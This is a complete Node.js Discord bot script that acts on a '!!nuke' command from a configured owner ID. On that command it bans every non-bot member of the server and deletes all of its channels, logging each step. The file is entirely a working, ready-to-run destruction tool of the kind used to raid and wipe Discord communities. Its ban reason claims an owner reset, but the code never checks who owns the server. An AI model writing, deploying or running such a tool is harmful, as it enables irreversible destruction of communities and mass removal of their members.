const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js')

const token = process.env.TOKEN
const ownerId = process.env.OWNER_ID

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
})

client.once('ready', () => {
  console.log(`🧨 Logged in as ${client.user.tag}`)
})

client.on('messageCreate', async (message) => {
  if (message.content === '!!nuke' && message.author.id === ownerId) {
    const guild = message.guild
    message.reply('💣 Nuking the server... please wait.')

    try {
      const members = await guild.members.fetch()
      for (const member of members.values()) {
        if (member.user.id !== ownerId && !member.user.bot) {
          await member.ban({ reason: 'Server reset by owner' })
          console.log(`🔨 Banned: ${member.user.tag}`)
        }
      }

      const channels = guild.channels.cache
      for (const channel of channels.values()) {
        await channel.delete()
        console.log(`❌ Deleted: ${channel.name}`)
      }

      console.log('✅ Nuke complete.')
    } catch (err) {
      console.error('❌ Nuke failed:', err)
      message.reply('⚠️ Something went wrong.')
    }
  }
})

client.login(token)
